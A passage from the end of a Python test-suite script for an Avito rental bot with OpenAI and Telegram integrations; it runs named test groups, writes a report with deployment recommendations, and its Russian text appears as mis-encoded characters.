            self.result.add_fail("–ù–∞–≥—Ä—É–∑–æ—á–Ω–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ", str(e))

    async def run_all_tests(self):
        """–ó–∞–ø—É—Å–∫ –≤—Å–µ—Ö —Ç–µ—Å—Ç–æ–≤"""
        print(f"{Colors.BOLD}{Colors.BLUE}")
        print("‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó")
        print("‚ïë                        AVITO RENTAL BOT TEST SUITE                           ‚ïë")
        print("‚ïë                     Comprehensive Production Testing                         ‚ïë")
        print("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù")
        print(f"{Colors.END}")
        
        # –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö —Ç–µ—Å—Ç–æ–≤
        tests = [
            ("–ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è", self.test_config_validation),
            ("Avito API", self.test_avito_client),
            ("OpenAI –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è", self.test_openai_integration),
            ("Telegram –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è", self.test_telegram_integration),
            ("–û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞", self.test_main_bot_logic),
            ("–ö–∞—á–µ—Å—Ç–≤–æ –ø—Ä–æ–º–ø—Ç–æ–≤", self.test_prompts_quality),
            ("–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫", self.test_error_handling),
            ("–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å", self.test_performance),
            ("–ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏–æ–Ω–Ω—ã–π –ø–æ—Ç–æ–∫", self.test_integration_flow),
            ("–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å", self.test_security),
            ("–ì–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –∫ —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏—é", self.test_deployment_readiness),
            ("–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ", self.test_monitoring_and_logging),
            ("–ù–∞–≥—Ä—É–∑–æ—á–Ω–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ", self.run_load_test)
        ]
        
        print(f"–ó–∞–ø—É—Å–∫ {len(tests)} –≥—Ä—É–ø–ø —Ç–µ—Å—Ç–æ–≤...\n")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç—ã
        for test_name, test_func in tests:
            try:
                await test_func()
            except Exception as e:
                self.result.add_fail(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –≤ {test_name}", str(e))
                print(f"{Colors.RED}–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –≤ —Ç–µ—Å—Ç–∞—Ö '{test_name}': {e}{Colors.END}")
                traceback.print_exc()
                
        # –í—ã–≤–æ–¥–∏–º –∏—Ç–æ–≥–∏
        self.result.print_summary()
        
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –æ—Ç—á–µ—Ç
        await self.generate_report()
        
        return self.result.failed == 0

    async def generate_report(self):
        """–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –æ—Ç—á–µ—Ç–∞"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_file = f"test_report_{timestamp}.txt"
            
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write("AVITO RENTAL BOT - –û–¢–ß–ï–¢ –û –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ò\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"–î–∞—Ç–∞: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"–ü—Ä–æ–π–¥–µ–Ω–æ —Ç–µ—Å—Ç–æ–≤: {self.result.passed}\n")
                f.write(f"–ù–µ –ø—Ä–æ–π–¥–µ–Ω–æ —Ç–µ—Å—Ç–æ–≤: {self.result.failed}\n")
                f.write(f"–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è: {self.result.warnings}\n\n")
                
                if self.result.errors:
                    f.write("–û–®–ò–ë–ö–ò:\n")
                    f.write("-" * 20 + "\n")
                    for error in self.result.errors:
                        f.write(f"‚Ä¢ {error}\n")
                    f.write("\n")
                
                # –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏
                f.write("–†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–ò –î–õ–Ø –ü–†–û–î–ê–ö–®–ï–ù–ê:\n")
                f.write("-" * 30 + "\n")
                f.write("1. –£–±–µ–¥–∏—Ç–µ—Å—å —á—Ç–æ –≤—Å–µ API –∫–ª—é—á–∏ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ\n")
                f.write("2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å –≤–Ω–µ—à–Ω–∏—Ö —Å–µ—Ä–≤–∏—Å–æ–≤ (OpenAI, Telegram, Avito)\n")
                f.write("3. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ª–æ–≥–æ–≤ –∏ –º–µ—Ç—Ä–∏–∫\n")
                f.write("4. –ü—Ä–æ–≤–µ–¥–∏—Ç–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö\n")
                f.write("5. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ backup –∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏–π\n")
                f.write("6. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –ª–∏–º–∏—Ç—ã –Ω–∞ —Ä–µ—Å—É—Ä—Å—ã (CPU, –ø–∞–º—è—Ç—å)\n")
                f.write("7. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–∞—Ö\n")
                
            print(f"\n{Colors.CYAN}–î–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω: {report_file}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –æ—Ç—á–µ—Ç–∞: {e}{Colors.END}")

async def main():
    """–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    tester = AvitoRentalBotTester()
    
    try:
        success = await tester.run_all_tests()
        
        if success:
            print(f"\n{Colors.GREEN}{Colors.BOLD}üéâ –í–°–ï –¢–ï–°–¢–´ –ü–†–û–ô–î–ï–ù–´! –°–ò–°–¢–ï–ú–ê –ì–û–¢–û–í–ê –ö –ü–†–û–î–ê–ö–®–ï–ù–£! üéâ{Colors.END}")
            sys.exit(0)
        else:
            print(f"\n{Colors.RED}{Colors.BOLD}‚ùå –û–ë–ù–ê–†–£–ñ–ï–ù–´ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –ü–†–û–ë–õ–ï–ú–´! –°–ò–°–¢–ï–ú–ê –ù–ï –ì–û–¢–û–í–ê! ‚ùå{Colors.END}")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–µ—Ä–≤–∞–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Colors.RED}–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: {e}{Colors.END}")
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–æ–ª–∏—Ç–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π –¥–ª—è Windows
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    # –ó–∞–ø—É—Å–∫ —Ç–µ—Å—Ç–æ–≤
    asyncio.run(main())